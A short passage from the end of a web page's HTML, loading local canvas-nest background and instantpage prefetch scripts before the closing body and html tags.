        src="/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
